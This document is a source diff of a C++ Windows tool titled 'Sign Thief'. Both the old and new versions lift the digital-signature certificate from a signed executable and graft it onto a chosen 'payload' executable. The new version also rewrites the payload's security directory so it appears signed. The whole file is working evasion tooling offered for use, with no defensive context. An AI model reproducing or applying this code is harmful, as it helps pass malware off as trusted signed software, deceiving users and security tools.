@@ -1,56 +1,49 @@
-#include "main.hpp"
-#include <iostream>
 #include <fstream>
+#include <iostream>
+#include <windows.h>
+#include <vector>
 #include <stdexcept>
-#include <Windows.h>
 #include <string>
-#include <commdlg.h>
+#include <memory>
 
-signature_thief::signature_thief(std::filesystem::path path_to_file) : m_source_path(path_to_file) {}
+#pragma warning(disable : 4996)
 
-std::optional<std::string> signature_thief::load_file() noexcept {
-    std::ifstream file(m_source_path, std::ios::binary | std::ios::ate);
-    if (!file.is_open()) {
-        return "Error opening file: " + m_source_path.string();
+std::vector<BYTE> MapFileToMemory(const std::string& filename)
+{
+    std::ifstream file(filename, std::ios::binary | std::ios::ate);
+    if (!file) {
+        std::cerr << "Failed to open file: " << filename << std::endl;
+        throw std::runtime_error("File open error");
     }
 
-    auto size = file.tellg();
+    std::streamsize fileSize = file.tellg();
     file.seekg(0, std::ios::beg);
-    m_file.resize(size);
-    file.read(reinterpret_cast<char*>(m_file.data()), size);
 
-    return std::nullopt;
-}
-
-void signature_thief::extract_certificate(std::filesystem::path source_path) {
-    std::ifstream file(source_path, std::ios::binary | std::ios::ate);
-
-    if (!file.is_open()) {
-        throw std::runtime_error("Error opening file: " + source_path.string());
+    std::vector<BYTE> buffer(fileSize);
+    if (!file.read(reinterpret_cast<char*>(buffer.data()), fileSize)) {
+        std::cerr << "Failed to read file: " << filename << std::endl;
+        throw std::runtime_error("File read error");
     }
 
-    auto size = file.tellg();
-    file.seekg(0, std::ios::beg);
-
-    std::vector<uint8_t> buffer(size);
-    file.read(reinterpret_cast<char*>(buffer.data()), size);
-
-    auto* dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
-    auto* nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dos_header->e_lfanew);
-
-    auto& cert_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
-    auto cert_data_begin = buffer.begin() + cert_info.VirtualAddress;
-    auto cert_data_end = cert_data_begin + cert_info.Size;
-
-    std::span<uint8_t> cert_data(cert_data_begin, cert_data_end);
-    m_cert.assign(cert_data.begin(), cert_data.end());
+    return buffer;
 }
 
-void signature_thief::append_certificate_to_payload(std::span<uint8_t> signature_data) {
-    m_file.insert(m_file.end(), signature_data.begin(), signature_data.end());
+std::vector<BYTE> rippedCert(const std::string& fromWhere, LONGLONG& certSize)
+{
+    auto signedPeData = MapFileToMemory(fromWhere);
+    PIMAGE_NT_HEADERS ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(signedPeData.data() + reinterpret_cast<PIMAGE_DOS_HEADER>(signedPeData.data())->e_lfanew);
+
+    auto certInfo = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+    certSize = certInfo.Size;
+
+    std::vector<BYTE> certData(certSize);
+    std::memcpy(certData.data(), signedPeData.data() + certInfo.VirtualAddress, certSize);
+
+    return certData;
 }
 
-std::wstring open_file_dialog(const std::wstring& title, const std::wstring& filter) {
+std::wstring OpenFileDialog()
+{
     OPENFILENAME ofn;
     wchar_t szFile[260];
 
@@ -58,73 +51,94 @@ std::wstring open_file_dialog(const std::wstring& title, const std::wstring& fil
     ofn.lStructSize = sizeof(ofn);
     ofn.hwndOwner = GetConsoleWindow();
     ofn.lpstrFile = szFile;
+    ofn.lpstrFile[0] = L'\0';
     ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);
-    ofn.lpstrFilter = filter.c_str();
+    ofn.lpstrFilter = nullptr;
     ofn.nFilterIndex = 1;
-    ofn.lpstrFileTitle = NULL;
+    ofn.lpstrFileTitle = nullptr;
     ofn.nMaxFileTitle = 0;
-    ofn.lpstrInitialDir = NULL;
-    ofn.lpstrTitle = title.c_str();
-    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_OVERWRITEPROMPT;
+    ofn.lpstrInitialDir = nullptr;
+    ofn.lpstrTitle = L"Select a file";
+    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
 
-    if (GetOpenFileName(&ofn) == TRUE) {
-        return szFile;
-    }
+    if (GetOpenFileName(&ofn) == TRUE)
+        return std::wstring(ofn.lpstrFile);
 
     return L"";
 }
 
-void handle_drag_and_drop() {
-    std::wstring signed_pe_path = open_file_dialog(L"Select Signed File", L"All Files\0*.*\0");
-    if (signed_pe_path.empty()) {
-        std::wcerr << L"Error: Signed file not selected." << std::endl;
-        return;
-    }
+std::wstring SaveFileDialog(const std::wstring& filter)
+{
+    OPENFILENAME ofn;
+    wchar_t szFile[260];
 
-    std::wstring payload_path = open_file_dialog(L"Select Payload File", L"All Files\0*.*\0");
-    if (payload_path.empty()) {
-        std::wcerr << L"Error: Payload file not selected." << std::endl;
-        return;
-    }
+    ZeroMemory(&ofn, sizeof(ofn));
+    ofn.lStructSize = sizeof(ofn);
+    ofn.hwndOwner = GetConsoleWindow();
+    ofn.lpstrFile = szFile;
+    ofn.lpstrFile[0] = L'\0';
+    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);
+    ofn.lpstrFilter = filter.c_str();
+    ofn.nFilterIndex = 1;
+    ofn.lpstrFileTitle = nullptr;
+    ofn.nMaxFileTitle = 0;
+    ofn.lpstrInitialDir = nullptr;
+    ofn.lpstrTitle = L"Save as";
+    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
 
-    std::wstring output_path = open_file_dialog(L"Select Output Location", L"All Files\0*.*\0");
-    if (output_path.empty()) {
-        std::wcerr << L"Error: Output file not selected." << std::endl;
-        return;
-    }
+    if (GetSaveFileName(&ofn) == TRUE)
+        return std::wstring(ofn.lpstrFile);
 
-    signature_thief thief(signed_pe_path);
-    auto result = thief.load_file();
-    if (result) {
-        std::cerr << "Error appeared: " << *result << "\n";
-        return;
-    }
-
-    thief.extract_certificate(payload_path);
-    auto cert = thief.get_certificate();
-    thief.append_certificate_to_payload(cert);
-
-    auto binary = thief.get_binary();
-
-    std::ofstream output_file(output_path, std::ios::binary);
-    if (!output_file.is_open()) {
-        throw std::runtime_error("Error opening output file: " + std::string(output_path.begin(), output_path.end()));
-    }
-    output_file.write(reinterpret_cast<const char*>(binary.data()), binary.size());
-    output_file.close();
-
-    std::wcout << L"Signature appended successfully." << std::endl;
+    return L"";
 }
 
-int main() {
-    SetConsoleTitleA("Sign Thief - V.1.0.0");
-
+int main()
+{
     try {
-        handle_drag_and_drop();
-        return EXIT_SUCCESS;
+        std::wstring signedPePath = OpenFileDialog();
+        if (signedPePath.empty()) {
+            std::wcerr << L"No signed PE file selected." << std::endl;
+            return 1;
+        }
+
+        std::wstring payloadPePath = OpenFileDialog();
+        if (payloadPePath.empty()) {
+            std::wcerr << L"No payload PE file selected." << std::endl;
+            return 1;
+        }
+
+        std::wstring outputPath = SaveFileDialog(L"Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0");
+        if (outputPath.empty()) {
+            std::wcerr << L"No output file selected." << std::endl;
+            return 1;
+        }
+
+        LONGLONG certSize;
+        auto certData = rippedCert(std::string(signedPePath.begin(), signedPePath.end()), certSize);
+
+        auto payloadPeData = MapFileToMemory(std::string(payloadPePath.begin(), payloadPePath.end()));
+
+        std::vector<BYTE> finalPeData(payloadPeData.size() + certData.size());
+        std::memcpy(finalPeData.data(), payloadPeData.data(), payloadPeData.size());
+
+        PIMAGE_NT_HEADERS ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(finalPeData.data() + reinterpret_cast<PIMAGE_DOS_HEADER>(finalPeData.data())->e_lfanew);
+        ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadPeData.size();
+        ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;
+        std::memcpy(finalPeData.data() + payloadPeData.size(), certData.data(), certData.size());
+
+        std::ofstream outFile(std::string(outputPath.begin(), outputPath.end()), std::ios::binary);
+        if (!outFile) {
+            std::cerr << "Failed to open output file: " << std::string(outputPath.begin(), outputPath.end()) << std::endl;
+            return 1;
+        }
+
+        outFile.write(reinterpret_cast<const char*>(finalPeData.data()), finalPeData.size());
+        std::cout << "done." << std::endl;
     }
     catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-        return EXIT_FAILURE;
+        std::wcerr << L"Error: " << e.what() << std::endl;
+        return 1;
     }
+
+    return 0;
 }
